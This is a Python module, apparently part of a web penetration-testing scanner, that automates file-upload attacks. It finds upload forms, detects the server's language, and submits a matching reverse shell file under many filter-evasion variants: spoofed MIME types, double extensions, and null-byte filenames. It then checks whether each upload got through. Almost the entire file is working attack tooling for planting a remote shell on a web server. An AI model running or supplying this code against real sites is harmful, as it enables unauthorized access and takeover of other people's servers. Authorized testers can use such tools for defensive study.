from typing import Union
from modules import Scan
from core.libs import Http
import json
from pathlib import Path
import concurrent.futures
from modules.python.wappalyzer import Analyze


class Upload(Scan):
    def __init__(self, opts: dict, http: Http):
        super().__init__(opts, http)
        self.filename = "extension_prog_langugage.json"
        self.path_reverse_shell = "reverse_shell"

    def start(self):
        response = self.send_request(
            method="GET",
            url=self.opts['url']
        )

        content_html = response.content.decode('utf-8')

        forms = self.get_lists_form(content_html)
        if not forms:
            self.log.error('No form on this webpage')
            return None

        forms_with_upload = self.find_interresting_form(forms)

        if not forms_with_upload:
            self.log.error("No form where you can upload file")
            return None

        for index in forms_with_upload:
            form = forms[index]

            data = self.create_dict_data(form['inputs'])
            content_error = self.send_request(
                method=form['method'],
                url=form['action'],
                body=data,
                remove_content_type=True
            ).content.decode('utf-8')

            error_text = self.find_difference_between_two_html_file(content_html, content_error)

            if not error_text:
                self.log.error("Can't find the error text")

            # Check Programming language
            list_wappalyzer = Analyze(self.opts, self.http).start()
            programming_language = next(item['service'] for item in list_wappalyzer if item['categories'] == "Programming languages")

            # associate language to extension
            extension = self.associate_prog_extension(programming_language)
            if not extension:
                self.log.error("No reverse shell for this programming langugage")
                return None

            # Name input
            name_input_upload = self.find_name_input_upload(form)

            # Path of the reverse shell file
            path_reverse_shell_file = self.find_reverse_shell_file(extension)

            # Multiprocessing
            with concurrent.futures.ThreadPoolExecutor() as executor:
                files = self.create_list_files(
                    name_input=name_input_upload,
                    extension=extension,
                    path_reverse_shell_file=path_reverse_shell_file
                )

                results = [executor.submit(self.execute_file_upload, form['action'], file, data, error_text) for file in files]

                for f in concurrent.futures.as_completed(results):
                    if f.result()['is_upload']:
                        print(f.result()['message'])

    def find_interresting_form(self, forms: list) -> list:
        """Find the index of form where file upload is ok

        Args:
            forms (list): List of forms

        Returns:
            list: Index of form where you can upload file
        """
        list_index_form_file_upload = []

        for index, form in enumerate(forms):
            for input in form['inputs']:
                if input['type'] == "file":
                    list_index_form_file_upload.append(index)
                    break

        return list_index_form_file_upload

    def find_name_input_upload(self, form: dict) -> str:
        """Find the name of the input upload

        Args:
            form (dict): A dict with form information

        Raises:
            ValueError: No Input Upload

        Returns:
            str: The name of the input
        """
        for input in form['inputs']:
            if input['type'] == "file":
                return input["name"]

        raise ValueError('No input upload')

    def associate_prog_extension(self, prog_language: str) -> Union[str, None]:
        """Associate extension to programming_language

        Args:
            prog_language (str): the programming language

        Returns:
            (str, None): Extension or None
        """
        with open(f"modules/python/upload/{self.filename}") as json_file:
            data = json.load(json_file)
            if prog_language in data:
                return data[prog_language]

        return None

    def find_reverse_shell_file(self, extension_prog_language: str):
        path_folder_reverse = Path.cwd()/"reverse_shell"
        name_file_reverse_shell = f'reverse_shell.{extension_prog_language}'
        path_file_reverse_shell = path_folder_reverse/name_file_reverse_shell

        if path_file_reverse_shell.exists():
            return path_file_reverse_shell

        raise ValueError('No reverse shell file for this extension')

    def create_list_files(self, name_input: str, extension: str, path_reverse_shell_file) -> list:
        list_files = []
        dict_mime = {
            'jpg': 'image/jpeg',
            'png': 'image/jpeg',
            'pdf': 'application/pdf',
            'zip': 'application/zip'
        }

        # Simple reverse shell without modification
        list_files.append({
            "file": self.create_dict_file_to_upload(
                name_input,
                f'reverse_shell.{extension}',
                path_reverse_shell_file
            ),
            "message": "simple reverse shell upload"
        })

        for key, value in dict_mime.items():
            list_files.append({
                "file": self.create_dict_file_to_upload(
                    name_input,
                    f"reverse_shell.{extension}",
                    path_reverse_shell_file,
                    value
                ),
                "message": f"Change only Mime put {value}"
            })
            list_files.append({
                "file": self.create_dict_file_to_upload(
                    name_input,
                    f"reverse_shell.{extension}.{key}",
                    path_reverse_shell_file
                ),
                "message": f"Add only double extension {key}"
            })
            list_files.append({
                "file": self.create_dict_file_to_upload(
                    name_input,
                    f'reverse_shell.{extension}.{key}',
                    path_reverse_shell_file,
                    value
                ),
                "message": f"Add double extension and mime {key} - {value}"
            })
            list_files.append({
                "file": self.create_dict_file_to_upload(
                    name_input,
                    f'reverse_shell.{extension}%00.{key}',
                    path_reverse_shell_file,
                    value
                ),
                "message": f"Null Bytes %00 - {key}"
            })
            list_files.append({
                "file": self.create_dict_file_to_upload(
                    name_input,
                    f'reverse_shell.{extension}\x00.{key}',
                    path_reverse_shell_file,
                    value
                ),
                "message": f"Null Bytes \x00 - {key}"
            })

        return list_files

    def create_dict_file_to_upload(
            self,
            name_input: str,
            new_filename: str,
            file: str,
            mime_type: str = None
            ) -> dict:
        """Create the file to upload

        Args:
            name_input (str): The name of the input upload
            new_filename (str): the filename to upload
            file (str): The file to upload
            mime_type (str, optional): The mime type to use. Defaults to None.

        Returns:
            dict: The dict with the files
        """
        if not mime_type:
            files = {
                name_input: (new_filename, open(file, "rb")),
            }
        else:
            files = {
                name_input: (new_filename, open(file, "rb"), mime_type),
            }

        return files

    def execute_file_upload(self, url: str, files: dict, data: dict, error_text: str) -> dict:
        response = self.send_upload_file_request(url, files=files["file"], data=data)
        if error_text not in response.content.decode('utf-8'):
            return {
                "is_upload": True,
                "message": files["message"]
            }
        else:
            return {
                "is_upload": False,
                "message": files["message"]
            }
